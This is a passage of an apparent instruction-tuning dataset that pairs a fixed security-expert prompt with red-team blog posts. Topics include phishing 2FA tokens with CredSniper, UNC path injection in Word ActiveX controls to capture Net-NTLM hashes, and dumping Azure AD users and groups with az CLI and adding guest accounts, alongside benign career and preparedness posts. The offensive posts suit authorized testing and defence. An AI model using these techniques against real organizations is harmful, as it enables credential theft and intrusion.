Tradecraft Security Weekly video Phishing 2FA Tokens with CredSniper on YouTube The concept is fairly straightforward for every page you are trying to clone you will need a new template The new template will be loaded from your module and triggered by a route within CredSniper Without getting into the weeds here the module is loaded by CredSniper and each route will be auto-added to the built-in web server Each route is assigned a function within the module and it's the responsibility of the module to load the template If your HTML template is in the modules module templates directory and contains the proper template language CredSniper will automatically replace the templating language with the correct value With some sites like Gmail there are multiple pages Consider the lifecycle of the authentication process A user supplies an email address Google verifies the account If not valid lets the user know the email is invalid If valid continues A user password is requested by Google If not valid let's the user know the password is invalid If valid and 2FA not active redirects to GSuite If valid and 2FA active continues A 2FA token is requested by Google this is driven from the default user enrollment If SMS triggers text message to user with code If Authenticator prompts for OTP code If Yubikey prompts to insert and activate U2F device If Touch prompt prompts user to touch phone If user-agent reflects unknown browser prompts for SMS If valid token redirects to GSuite If valid token but suspicious context prompt for additional information The way CredSniper handles all of this is straightforward Prompt user for email Load profile image using email behind the scenes using Google's Picaso service Prompt user for password Authenticate behind the scenes with the email and password then identify if 2FA is enabled If 2FA is enabled capture additional information i.e last few digits of SMS OTP app name Duo Authenticator etc IP address geolocation If 2FA is disabled redirect to final destination URL configured in CredSniper Prompt user for 2FA token Redirect to final destination URL Check out an example phishing workflow Final Thoughts CredSniper has been an enormous success for our engagements at Black Hills and we have received lots of great feedback from users I wanted to take a second and also shine some light on another great tool called evilginx2 by a friend named Kuba Gretzky Evilginx2 will proxy connections between the target and phished website then intercept credentials and two-factor tokens by hosting its own HTTP and DNS server If CredSniper isn't what you are looking for I strongly suggest giving evilginx2 a try CredSniper ithub.com ustayready CredSniper Evilginx2 ithub.com kgretzky evilginx2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>DOs and DON'Ts of Pentest Report Writing</title>\n<taxonomies>How-To, Informational, Red Team, pentest report, Pentesting, reports</taxonomies>\n<creation_date>Thu, 23 Aug 2018 14:13:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melisa Wachs The first day of school has started for your school-age kiddos What better time to run through some of our basic reporting guidelines with y'all Here is a short list of points I've learned after ten years of reading and editing pen test reports here at Black Hills Information Security DO Set up a shared place where your team can communicate consistencies If you have more than one author it's good to have one voice to your report At BHIS the testers write in 3rd person past tense etc DON'T Be a lone wolf If you work as a team you will all improve and get better DO Remember that the report is the deliverable for all the awesome testing you've done but it's of no value unless you can communicate with the customer You can make the report educational informative and fun for your readers DON'T Offend your customer Take your ego out of the equation The report is not a personal platform for you to show off how great you are or boast about how weak a customer's environment may be A Solid Report is a Key to Earning Returning Customers DO Remember that it is your role to help improve the entire industry by educating each customer you have It is our goal to have returning customers and that happens by having an educator's attitude with charity toward your customers DON'T Don't have a condemning or demeaning attitude in your reports Your customers came to you for a reason What does this look like and how do you watch for it Look at your descriptive adjectives and adverbs Are you over-emphasizing with emotion If so you're likely delivering a toned report DO Start with a fresh reporting document each time DON'T Copy pasting from an old report This is not acceptable and easily leads to including information from a previous customer Identifying other customers in a report is bad Very very bad DO Remember your audience and executives need a section that speaks to them The tech personnel needs their own methodology DON'T Don't speak only to the tech people or to the execs Simply put make sure you're bringing value to all facets of the company DO Take ratings seriously You're the expert after all Be sure to give your reasons for the rating DON'T Take ratings too seriously If a customer feels like the rating should shift because of some political or specific situation within their environment let them They're experts on their environment after all DO If you haven't already done so consider implementing a tech review and a grammatical review before delivering a report to the customer This ensures two lines of defense before a report goes to a customer DON'T Reviewers are an asset not a threat Don't be combative within your team over having a report edited If you're new to pentesting or even new to a company they are likely going to want to have your reports edited and watched closely at first DO Take notes and screenshots while you test I promise that this will make your life so much easier when you sit down to write a report DON'T Procrastinate Write the report as soon as you can preferably as you actually test If you're unclear or sloppy you will likely be called out by the customer to explain further Also the fresher the information is in your mind the better the report will be Imagine you have to defend your test to lawyers via only the report That line of thinking is a solid way of ensuring a detailed and swift reporting process From the Archives yr 199-Strand Last Day of Summer First Day of School Pic Here's to another school year beginning and a continuation of lifelong learning"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Having Fun with ActiveX Controls in Microsoft Word</title>\n<taxonomies>Red Team, ActiveX Controls, Microsoft Word, Red Team, UNC path injection, Windows Media Player</taxonomies>\n<creation_date>Thu, 30 Aug 2018 15:44:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Marcello Salvati During Red Team and penetration tests it's always important and valuable to test assumptions One major assumption I hear from Pentesters Red teamers and clients alike is that most networks or their own network block outbound SMB traffic In my phishing payloads I always try to inject a UNC path If macros are disabled in the environment I'm targeting I might still be able to grab the users Net-NTLM hash if that assumption proves to be incorrect UNC path injection in Word documents is by far nothing new Over the years there have been multiple blog posts on how to achieve this However they all involved modifying the underlying XML of the document itself which made the process a little cumbersome and somewhat time-consuming Not too long ago I had some spare time and decided to play around with Word and see if I could find anything of interest Inspired by some of the work that subtee and enigma0x3 were putting out at the time at WWHF but I was also feeling really lazy so I thought to myself I might get lucky and come across something interesting if I just start pressing the really really small hidden buttons that people rarely don't use or see that often Turns out that's a totally valid method of finding awesomeness The following has been tested on Windows 7 through 10 with the latest version of Office UNC Path Injection Using Windows Media Player ActiveX Control Ok so first thing I might want to do is enable the Developer Tools They aren't in the ribbon by default which means it's probably a good place to start looking File Options Customize Ribbon Scroll down the Right pane and check Developer Tools Ok and voila After hovering over some of the buttons the little toolbox with the screwdriver and wrench caught my eye especially when I read the description that said Legacy Tools you had me at legacy Clicking that brought up another selection box Playing around with the Legacy Forms objects didn't prove to be fruitful Active X Controls seems to be much more interesting lo and behold yet another screwdriver and wrench icon let's click that Down the rabbit hole we go In keeping with the theme of looking for the things that people rarely use or see that often let's scroll this bad boy all the way down and see what the last few controls are Oooook I have zero clue what any of these are good sign but I know what Windows Media player is click I present to you Windows Media player in a Word Document my mind is officially blown and I have so many questions I have to at least get this to play something now I'm in too deep Hmmm there's a Properties in the right-click context menu Woah Hang on now this went from funny to interesting really fast There's a URL field What happens if I just give it a UNC path Will it try and authenticate to the server I specify And sure enough save close re-open the document and not only are there no security warnings but we get a Net-NTLM hash Attentive readers might have noticed there are a Height and Width field in that properties window as well let's play the classic yet underappreciated game of Find the Windows Media Player in my Word Document Impressive I'm pretty sure I won UNC Path Injection Using ShockWave Flash Object ActiveX Control In that same More controls menu I discovered that the ShockWave Flash Object ActiveX Control can be used for UNC path injection as well Inserting that into the document and bringing up its properties window shows us a lot of fields we can play around with We're interested in the EmbedMovie and Movie fields by setting the first field to true and the latter to a UNC path we have the same results as before the ActiveX control automatically authenticates to the server we specify when the document is opened It also has the Height and Width fields so we can make this completely invisible too Further Research Random Observations While playing around with these controls I noticed a couple of things If the ActiveX control fails to connect to the specified SMB server it will automatically fall over to WebDav normal behavior with UNC paths but interesting this is still the case with ActiveX controls Given an http s URL they will perform an HTTP GET request to the specified resource This could be incredibly interesting combined with a file format vulnerability in the Windows Media Player ActiveX control for example While googling I came across a very interesting blog post from 2016 titled Running Macros Via ActiveX Controls Turns out as the title implies you can use a lot of these controls to run macros using their built-in procedures instead of using the usually reserved names such as AutoOpen and Document_Open to automatically run macros The great thing about this method is the security warning prompt is completely different than the standard macro one meaning users might fall for this if trained to only look for the macro warning I've tested this out on the latest version of Office and it still works This is the prompt that gets displayed when opening a macro-enabled document that uses an ActiveX control to automatically run it PhishingProTip I highly recommend reading the blog post as the author even provides sample documents to play around with Disclosure Timeline Although Microsoft has not addressed UNC path injections in Word in the past I thought it would be best to report at least the Windows Media Player method to them as it's trivial to weaponize 2 23 2018 Initial Report to MSRC 2 25 2018 Response from MSRC assigned case number 7 10 2018 Response from MSRC Issue closed as a defense in depth fix For the Blue Team Obviously the quick fix for this is to implement proper egress filtering and block SMB port 445 outbound If for some reason that isn't possible you can disable ActiveX controls entirely just like macros via Group Policy Preferences Preferably you'd want to do both P.S If you're wondering why there aren't any security warnings when opening a document with the Windows Media Player or ShockWave Flash controls at least from my understanding it's because they aren't classified as Unsafe for Initialization UFI Conclusion We've found two novel techniques or at least two easier ways to perform UNC path injections in Microsoft Word documents and potentially opened up a whole new or old depending on your perspective can of worms ActiveX Controls in office products should absolutely be explored further by the security community as a whole from my Google-Fu there doesn't seem to be a lot of research on these and I'm almost certain this is just the tip of the Iceberg"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Red Teaming Microsoft: Part 1 - Active Directory Leaks via Azure</title>\n<taxonomies>Author, Informational, Mike Felch, Red Team, Red Team Tools, Active Directory, Azure, reconnaissance, Red Team</taxonomies>\n<creation_date>Fri, 31 Aug 2018 16:59:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Felch With so many Microsoft technologies services integrations applications and configurations it can create a great deal of difficulty just to manage everything Now imagine trying to secure an environment that goes well beyond the perimeter While moving everything to a cloud provider can provide amazing returns in scalability functionality and even savings it can also create major blind-spots Over the past year I have been looking into ways to target organizations that utilize Microsoft as their cloud provider I hope to release a number of different techniques that have been extremely beneficial in uncovering these blind-spots much like the research Beau Bullock dafthack and I did when we focused our scope on Google I won't begin to mislead you I am no Microsoft expert In fact the more I read about the products and services the more I felt lost While over the past year I've been able to maneuver through and bend these technologies in order to target the organizations better from a red team perspective I struggled to try to understand many different concepts What is the default configuration for this Is this provided by default Is this syncing with everything If I make changes here do they propagate back Why not The list goes on and on When I've shared some of these techniques privately it was inevitable that a question would immediately follow While I feel bringing a problem without a solution is irresponsible there may be times like now where solutions aren't black and white My advice is to know your environment know your technologies and if you aren't sure then reach out to your service provider so you can be sure The Microsoft Landscape So you've been running Microsoft Active Directory and Exchange on-prem for years but want to quickly deploy Microsoft Office to your employees while also providing them with access to a webmail portal Sharepoint and SSO for some internal applications Somewhere along the way you decided to migrate to Office 365 and everything works well All your users can authenticate with their network credentials and their email works great Would you consider yourself an on-prem organization still or are you in the infamous cloud now Maybe you took a hybrid approach and did both Microsoft provides an amazing amount of integrations that they support but how do you know if you are managing everything correctly A Hypothetical Complex Situation For managing users on-prem there's the traditional Microsoft AD For managing users in cloud services you could leverage Azure AD For mail there's Exchange on-prem but you could always move email to Exchange online If you want the full suite of Microsoft Office there's Office 365 but I think that routes through Exchange online in a Microsoft multi-tenant environment anyhow so you could technically be using both but paying for one Since you paid for Office 365 Business you were also provided a number of services like Skype and OneDrive despite using GDrive or Box for corporate file sharing You enroll in a multi-factor solution with SMS tokens being the default delivery mechanism but for some reason your users can still authenticate with Outlook without needing MFA weird Major thanks to Microsoft EWS Overall everything just works and for that we have to thank Azure AD Connect or is it Azure AD Synchronization Services or are we still running old school DirSync with Forefront Identity Manager Whatever it is it's working and that's all that matters So What's the Big Deal A number of problems are created in the situation just illustrated and there is very little a blue team can do to defend or respond to a number of different attacks ranging from dumping active directory remotely to bypassing and even hijacking multi-factor authentication for users Understanding who is who within an organizational department is typically done in the reconnaissance phase of an engagement through third-party services like LinkedIn or other OSINT techniques If you are on the internal network then revisiting this step is crucial because you need to understand deeper details of the organization like what groups are configured and who are the members of those groups This is vital in being able to successfully pivot to relevant machines and targeting users based on their access so that escalation can be accomplished But what if you aren't on the internal network but still need to determine who to target Even better what if the target gems of the organization are hosted in the cloud and you never actually have to hit the internal network With Microsoft if you are using any cloud services Office 365 Exchange Online etc with Active Directory on-prem or in Azure then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD Step 1 Authenticate to your webmail portal i.e ebmail.domain.com Step 2 Change your browser URL to zure.microsoft.com Step 3 Pick the account from the active sessions Step 4 Select Azure Active Directory and enjoy This creates a number of bad situations For instance if we were able to export all the users and groups we would have a very nice list of employees and the groups they are a part of We can also learn what group we need to land in for VPN domain administration database access cloud servers or financial data What's also nice about Azure AD is that it holds the device information for each user so we can see if they are using a Mac Windows machine or iPhone along with the version information i.e Windows 10.0.16299.0 As if all this wasn't great already we can also learn about all the business applications with their endpoints service principal names other domain names and even the virtual resources i.e virtual machines networks databases that a user might have access to But Wait There's More An added benefit to authenticating to the Azure portal as a regular user is that you can create a backdoor err I mean a Guest account How super convenient Step 1 Click Azure Active Directory Step 2 Click Users under the Manage section Step 3 Click New Guest User and invite yourself Depending on their configuration it may or may not sync back to the internal network In fact while creating guest accounts is on by default I've only verified one customer where Azure AD Connect was a bi-directional sync allowing guest accounts to authenticate enroll a multi-factor device and VPN internally This is an important configuration component for you to understand since it can create a bad day Azure for Red Teams Accessing the Azure portal through the web browser is great and has many awesome advantages but I have yet to find a way to export the information directly I started to write a tool that would authenticate and do it in an automated fashion but it felt cumbersome and I knew with all of these awesome technologies tied together that Microsoft has solved this problem for me There were a number of solutions I came across some of them are Azure CLI AZ CLI Being a Linux user I naturally gravitated towards AZ CLI Partially because I pipe as much data into one-liners as possible and partially because I over-engineer tools in .NET Using AZ CLI is a quick and easy way to authenticate against the OAUTH for Azure while also quickly exporting the raw data In this post we will focus on this solution Azure Powershell With a rise in awesome Powershell tools like Powershell Empire and MailSniper I'm amazed that Azure Powershell hasn't made its way into one of these tools There are a massive number of Active Directory Cmdlets to interact with To get started simply install Azure RM Powershell then run Connect-AzureRmAccount Azure .NET I am one of those weird nerds who grew up on Linux but wrote C for a significant portion of my career Because of this having an Azure .NET library to interact with Active Directory is encouraging I didn't dig too much into these libraries but from a high-level it seems they are some sort of wrapper for the Active Directory Graph API Let's Dig In As I previously mentioned we will focus on interacting with Azure using AZ CLI In order to get started we have to first establish an active session with Azure On red teams where the engagement involves an organization using Microsoft or Google services I rarely try to go straight to a shell on the internal network I will normally use a tool I wrote called CredSniper to phish credentials and multi-factor tokens than just authenticate as that user in pursuit of sensitive emails files access information and VPN Will that presupposition we will assume valid credentials were already obtained somehow Install AZ CLI You will need to add the Microsoft source to apt assuming Linux install the Microsoft signing key and then install Azure CLI AZ_REPO lsb_release -cs echo deb arch amd64 ackages.microsoft.com repos azure-cli AZ_REPO main sudo tee etc apt sources.list.d azure-cli.list curl -L ackages.microsoft.com keys microsoft.asc sudo apt-key add sudo apt-get install apt-transport-https sudo apt-get update sudo apt-get install azure-cli Authentication via Web Session After everything is installed correctly you will need to create a session to Azure using the credentials you already obtained The easiest way to do that is by authenticating using ADFS or OWA in a normal browser then az login This will generate the OAUTH tokens locally open a browser tab to the authentication page and let you select an account based on the ones you are already authenticated with Once you select the account the local OAUTH tokens will be validated by the server and you won't have to do that again unless they expire or get destroyed You can also pass the --use-device-code flag which will generate a token you provide to icrosoft.com devicelogin Dumping Users Now on to my favorite part There have been numerous techniques for extracting the GAL previously researched such as using the FindPeople and GetPeopleFilter web service methods in OWA These techniques have been an excellent resource for red teamers but they definitely have their limitations on what data is available how long it takes to enumerate users how loud it is due to the number of web requests required and how it occasionally breaks With AZ CLI it's super easy to extract all the directory information for each user In the examples below I apply a JMESPath filter to extract the data I care about I can also export as a table JSON or in TSV format All Users az ad user list --output table --query Created createdDateTime UPN userPrincipalName Name displayName Title jobTitle Department department Email mail UserId mailNickname Phone telephoneNumber Mobile mobile Enabled accountEnabled Specific User If you know the UPN of the target account you can retrieve specific accounts by passing in the --upn flag This is convenient if you are wanting to dig into the Active Directory information for a particular account In the example below you will notice I supplied the JSON format instead of the table output az ad user list --output json --query Created createdDateTime UPN userPrincipalName Name displayName Title jobTitle Department department Email mail UserId mailNickname Phone telephoneNumber Mobile mobile Enabled accountEnabled --upn Dumping Groups My next favorite function is the ability to dump groups Understanding how groups are used within an organization can provide specific insight into the areas of the business the users and who the admins are AZ CLI provides a few useful commands that can assist here All Groups The first thing I usually do is just export all the groups Then I can grep around for certain keywords Admin VPN Finance Amazon Azure Oracle VDI Developer etc While there is other group metadata available I tend to just grab the name and description az ad group list --output json --query Group displayName Description description Specific Group Members Once you have reviewed the groups and cherry-picked the interesting ones next it's useful to dump the group members This will give you an excellent list of targets that are a part of the interesting groups prime targets for spear phishing Against popular opinion I have personally found that the technical ability and title do not lower the likelihood an intended target is more likely to avoid handing over their credentials and even MFA token In other words everyone is susceptible so I usually target back-end engineers and devops teams because they tend to have the most access plus I can usually remain external to the network yet still access private GitHub GitLab code repositories for creds Jenkins build servers for shells OneDrive GDrive file shares for sensitive data Slack teams for sensitive files and a range of other third-party services Once again why go internal if you don't have to az ad group member list --output json --query Created createdDateTime UPN userPrincipalName Name displayName Title jobTitle Department department Email mail UserId mailNickname Phone telephoneNumber Mobile mobile Enabled accountEnabled --group Dumping Applications Service Principals Another nice feature Microsoft provides is the ability to register applications that use SSO ADFS or integrate with other technologies A lot of companies utilize this for internal applications The reason this is nice for red teamers is that the metadata associated with the applications can provide deeper insight into attack surfaces that may have not been discovered during reconnaissance like URLs All Applications az ad app list --output table --query Name displayName URL homepage Specific Application In the below screenshot you see we obtained the URL for the Splunk instance by examining the metadata associated with the registered application in Azure az ad app list --output json --identifier-uri All Service Principals az ad sp list --output table --query Name displayName Enabled accountEnabled URL homepage Publisher publisherName MetadataURL samlMetadataUrl Specific Service Principal az ad sp list --output table --display-name Advanced Filtering with JMESPath You might have noticed in the above examples that I try to limit the amount of data that is returned This is mainly because I try to snag what I need instead of everything The way AZ CLI handles this is by using the --query flag with a JMESPath query This is a standard query language for interacting with JSON I did notice a few bugs with AZ CLI when combining the query flag with the 'show built-in functions The other thing to note is that the default response format is JSON which means if you plan on using a query filter you need to specify the correct case-sensitive naming conventions There was a bit of inconsistency between the names for the different formats If you used the table format it might capitalize when JSON had lowercase Disable Access to Azure Portal I spent a bit of time trying to make sense of what to disable how to prevent access how to limit what to monitor and even reached out to people on Twitter thanks Josh Rickard I appreciate all the people who reached out to help make sense of this madness I suppose I should learn the Microsoft ecosystem more in hopes of offering better suggestions Until then I offer you a way to disable the Azure Portal access to users I haven't tested this and can't be sure if this includes AZ CLI Azure RM Powershell and the Microsoft Graph API but it's definitely a start Step 1 Log in to Azure using a Global Administrator account ortal.azure.com Step 2 On the left panel choose 'Azure Active Directory Step 3 Select 'Users Settings Step 4 Select 'Restrict access to Azure AD administration portal An alternative is to look into Conditional Access Policies ocs.microsoft.com en-us azure active-directory conditional-access overview Coming Soon There are a number of different tools out there for testing AWS environments and even new tools that have come out recently for capturing cloud credentials like SharpCloud Cloud environments seem to be a commonly overlooked attack surface I will be releasing a currently private red team framework for interacting with cloud environments called CloudBurst It's a plugginable framework that gives users the ability to interact with different cloud providers to capture compromise and exfil data"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Find an InfoSec Mentor</title>\n<taxonomies>Author, Brian King, How-To, Informational, InfoSec 101, FAQ, general infosec, General Questions, getting started, mentor, new to infosec</taxonomies>\n<creation_date>Wed, 05 Sep 2018 15:55:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "BB King We got an email from a fan today asking how best to find a mentor in information security Maybe you're looking for a mentor too It's a great question Much of the advice you see for people looking to make their start in infosec is something like Work at the helpdesk or in system administration for a while This gives you a chance to see computer systems and networks at work in the real world and to experience their limitations first-hand It's good advice The only problem with it is that there is no clear signal telling you when you're ready to move on Systems administration is a career in itself We need these people But if you want to use it as a stepping-stone to other things how do you know when you've learned enough There are careers with a clear path of advancement In the trades carpenter electrician plumber etc it's apprentice journeyman master For the true professions doctor lawyer accountant etc there's higher education internships exams an oath and acceptance in a professional society It seems like a career is what you end up with after you've completed some third-party validated set of requirements In information security we don't have that and sometimes it feels like it's missing Maybe a mentor could take the place of all the structure and clarity we don't have built-in If so then finding a mentor seems like just the thing to fill the gap between No accepted formal path and ...but I don't know enough yet Or perhaps not Mentor implies a deep and long-lasting relationship and invites a heavy influence on you Consider some lighter-weight options Maybe you want a partner to work on a project Maybe you want a peer to talk with over lunches Maybe you want a friend or a coach to help you set goals and hold you accountable for progress Maybe you want a place where helpful people hang around Maybe this mentor doesn't have to be a single person at all The path to entering one of the true professions can be attractive because it's so clear But there are lots of paths to a career in information security Don't be too quick to accept someone else's path as the right one for you Before you decide that a mentor is what you need first decide what you expect out of the relationship on both sides Be clear in your own mind so you can be clear when you pop the question Then look for someone local to you Approach someone you already know or whose path crosses yours regularly Find a more senior security person at your company or someone in a local security-related meetup Describe the role you have in mind for a mentor how you plan to fill your complementing role and ask them if they'd be willing to build a relationship like that with you Whichever route you choose there's one thing you can do that can help you develop your reputation and consolidate what you learn Share what you're working on Blogging is still the best outlet Your blog will be a body of work you can point to that says Look at this I'm doing the best I can in these particular areas I'm doing better now than I was six months ago Produce something that proves you're not only willing to do to the hard work because lots of people say that but that you're already doing it Post whatever you did on your project this week even if it feels like a series of failures If you spun up a Digital Ocean droplet installed some software and got your blog running there then that's your first post How I Set Up My Blog and Why I Chose What I Chose Show your thought process A good mentoring relationship can get you guidance and encouragement that you can't get anywhere else But you may find that you don't really need something so heavy and involved as a mentor after all Maybe you just need a little bit of focused interaction with others now and then as you learn for yourself that we're all just making it up as we go and you can make stuff up too"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Do You Know What Devices Are on Your Network?</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Thu, 13 Sep 2018 15:32:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Bryan Strand I have recently started taking SEC566 with James Tarala via SANS on the CSC 20 Critical Controls and decided it would be a great blog series to do a quick overview of each of the controls and how you could start implementing them on your network This is by no means an in-depth breakdown of each control but more of a quick read to get you thinking about what you are currently doing or what you can start doing to shore up your defenses CSC 1 Inventory and Control of Hardware Assets Even though it seems a simple enough question many organizations struggle with knowing what devices are on their network But if you think about it how can you possibly begin to think about defending your network if you don't know what to defend in the first place This should probably be where a security team starts if they want to begin down the path of defending their network Even if you are a highly mature security team but aren't doing this START NOW Because it can be hard Let's break down some great ways to do this A good place to start is by setting up an active discovery tool Don't feel bad about using a vulnerability scanner here like Nessus Qualys or Nexpose to help create an inventory They do the job quite well and if you are already using one you don't have to worry about forking out the extra money to buy an active discovery tool that does this exclusively Although there are some great tools like Tanium that can do this very well at a cost Even Nmap with Ndiff can do this for you and they are completely free In conjunction with an active discovery tool you also want to implement a passive discovery tool IPAM is a great place to start and there are several to look into With these two you now have A way to go around your network intentionally looking for devices connecting to your network Another monitoring broadcast traffic on your network Think Bro with user agent strings Bro capturing IP address and Services Bro capturing User Agent Strings The above two screenshots highlight how Bro can passively capture information about systems on your network Next you may want to enable DHCP logging on your network The average bad guy generally sits on a network several months around 270 days according to Madiant before they get discovered Without DHCP logging it can be incredibly difficult to go back and look at the information on a particular IP address from a potential incident several months ago So what are you supposed to do with this inventory and logging Simply just having this information sitting on a log or file somewhere isn't going to be much help Information about what devices are on your network is cool and all but information ABOUT the devices on your network is much much cooler and can save a ton of time Each device on your network should also have accompanying information linked to it like The name of the device Data asset owner who commissioned that machine Hardware address Network address If that device has even been approved to be on the network in the first place Any other information you and your team find valuable It should go without saying but when information like this is put together and a device accesses your network that isn't authorized make sure there is a plan in place to remove that device in a time frame that is agreed upon by your team or to authorize it It also can help answer the question What is this Now that we have captured this information let's look at a more preventative approach to devices trying to get on your network and how to secure that Two great practices for your organization should be to require 802.1x and NAC and client-side certificates to authenticate connecting to your network This doesn't just mean endpoint laptops and desktops but servers and phones as well You most likely will be looking into a commercial solution like Cisco ISC or ForeScout for this But remember implementing the controls is about finding the quick easy wins and working your way up to more complicated solutions Just consider a commercial NAC solution a future point on your security roadmap Now at this point I know some readers might feel a little overwhelmed with where to even begin with this or feel like this just isn't possible I have had several conversations with individuals who are the only security personnel for their company Tackling this first step alone can be daunting and it might seem like you will have to break the budget to get started Or you might also be thinking that you got this locked down and completely figured out Either way I wanted to provide some free or open source tools that are available for you to get a better handle on this task Automation is optimal here but if money is an issue then check out these free tools below Nmap OSSIM Spiceworks PacketFence OpenNAC On a final note there is no need to rush this Don't give up nights weekends or holidays with family just because you can't convince management to throw down some money to help automate this or get a tool to help you This shouldn't be something you worry about getting perfect by next week Security isn't a destination it's a process and this is just the first step for what you can do to get a handle on it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Digital Bug Out Bag: A Nerd and His Family Running From a Hurricane</title>\n<taxonomies>Author, Derek Banks, Fun & Games, Informational, disaster preparedness, emergency, hurricane, hurricane florence, what to pack for a hurricane</taxonomies>\n<creation_date>Thu, 20 Sep 2018 14:22:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks I live in an area that was initially projected to be hit by Hurricane Florence Four days prior to the storm making landfall the governor of my state issued a mandatory evacuation for the zone that I live in The floor of my house is about nine feet above sea level and there is a ditch in my backyard that fills up when tidal flooding occurs During a hurricane that stayed offshore a few years ago this was someone kayaking through my backyard during high tide The reports were that the storm could bring a 13 foot plus storm surge the picture above was 3 feet above normal high tide so it seemed plausible that we could get flooded All part of the joy of living on the coast My wife and I had rode out hurricanes and nor'easters in the past for those not on the East Coast sometimes the nor'easters can be as bad and even worse than hurricanes If it were just us we may have stayed but with two kids we decided leaving was a better idea Our plan was to find a hotel inland a bit away from the flooding but not too far so we could have a better chance of making it home right after the storm to get to work on cleanup and recovery Time to pack up a bug out bag But what to pack Since the family wife two kids and pets were headed to an inland hotel shelter was taken care of Our main concerns were power for devices communication lighting and water When my wife and I stayed put for Isabel in 2003 the conditions were similar to what was happening with Florence a lot of rain all summer making the ground soft and leading to a lot of downed trees and powerlines Back in 2003 power was important for sure I remember borrowing battery backups from the servers at work but our lives are even more dependant now on digital devices especially for communication These days if your smartphone dies you're not going to easily call anyone I can't remember the last time I saw a pay phone in my area For emergency purposes this is probably the most important item in the bag though it probably really lives in your pocket Also I thought it would be a good idea to keep devices that would keep the kids minds off the emergency such as their Nintendo Switches and cell phones yes my kids already have cell phones As with the Physical Pentest Gobag talk from 2017 I used the 36 liter version of the GoRuck GR2 That's generally the bag I use for travel and it has plenty of room and it comfortable to carry Also I am pretty sure it is bomb proof For communication related devices I packed the following Smartphone Grundig FR200 emergency radio Baofeng UV-5RA Two-way radio WiFi Hotspot I figured that if the power did go out I would be able to tune into radio stations with the Grundig FR200 its out of production I've had it a long time But similar radios are not that expensive Plus it can receive some shortwave signals and has a hand crank and rechargeable battery I threw in the Baofeng two way radio just in case if it did get really bad there may be repeaters around that were still functional I had preprogrammed some repeaters on the radio with Chirp plus had a relatively recent repeater directory in my truck The WiFi hotspot is something I usually take on travel anyway because I am usually untrusting of wireless networks and use my own if I can help it For power related items I had a collection of micro usb lighting and USB-C There seem to be more that necessary in the picture that's because I had cables for my wife's and kids devices as well as I figured that they may potentially forget to bring some my youngest brought eight Barbie dolls when I told her to go pack up items she thought were necessary and essential In addition to the cables I had a Belkin travel surge protector with two USB ports and three outlets on it I thought this would be enough to keep devices and batteries topped off with charge while there was still power Combined with some other wall warts this turned out to be the case for the most part But the outlet above the table in the hotel room did look similar to the Clark Griswold Christmas Vacation lighting outlet for the trip I packed two 10000 mA battery packs and a folding RAVPower folding solar panel with two outputs I used the solar panel on a past hunting trip and it was able to mostly charge the battery I had at the time during the course of the day The Dark Energy Poseidon battery pictured above seemed to be able to charge my iPhone two times when full Keeping devices charged was an issue even with power though if it came down to it some of the less critical items like the Switches would have to wait in line behind phones All the devices that could be charged and I may be missing something One laptop Four cell phones Two battery packs MiFi Two Nintendo Switches Three Bluetooth headphones GoPro Camera and batteries Two-way radio Amazon Kindle and two other tablets Two Apple Watches The next time around I would likely bring two small power adapter extension cords for the power strip to make room for larger adapters if I needed to I also brought a GoPro Hero 5 because I thought it would be good for documentation if necessary as well as 